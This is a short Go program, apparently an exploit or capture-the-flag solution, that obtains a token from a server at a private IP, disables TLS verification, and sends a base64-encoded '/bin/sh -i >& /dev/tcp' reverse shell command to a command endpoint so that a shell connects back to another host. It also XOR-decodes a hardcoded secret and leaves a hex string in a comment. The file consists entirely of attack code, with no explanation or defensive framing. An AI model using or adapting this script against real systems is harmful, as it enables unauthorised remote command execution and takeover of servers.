package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
)

var uuid string = "2b56fd73-d8e5-47a4-9fb5-bb9f99913060"

func getToken(u string) string {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	data := map[string]string{"uuid": uuid}
	json_data, _ := json.Marshal(data)
	resp, err := http.Post(u+"/register/new", "application/json", bytes.NewBuffer(json_data))
	if err != nil {
		fmt.Print(err)

	}

	a, _ := ioutil.ReadAll(resp.Body)
	var f interface{}
	err = json.Unmarshal(a, &f)
	if err != nil {
		fmt.Print(err)
	}

	return f.(map[string]interface{})["token"].(string)
}

func getShell(tk, u, ip, port string) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	shell := "/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
	cmd := u + "/do/cmd/" + base64.StdEncoding.EncodeToString([]byte(shell))
	fmt.Print(cmd)
	req, _ := http.NewRequest("GET", cmd, nil)
	req.Header.Set("X-UUID", uuid)
	req.Header.Set("X-Token", tk)
	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Print(err)
	}
	b, _ := ioutil.ReadAll(resp.Body)
	fmt.Print(string(b))

}

func getPassword() string {
	integrity_check := "YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ=="
	data, _ := base64.StdEncoding.DecodeString(integrity_check)
	key := []byte{'T', 'h', 'i', 's', ' ', 'i', 's', ' ', 'a', ' ', 's', 'u', 'p', 'e', 'r', ' ', 's', 'e', 'c', 'r', 'e', 't', ' ', 'm', 'e', 's', 's', 'a', 'g', 'e', '!'}
	var pass []byte
	for i := range data {
		pass = append(pass, data[i]^key[i%len(key)])

	}
	return string(pass)
	//40373df4b7a1f413af61cf7fd06d03a565a51898
}
func main() {
	getPassword()
	getShell(getToken("https://10.0.1.21"), "https://10.0.1.21", "10.0.1.4", "8081")
}
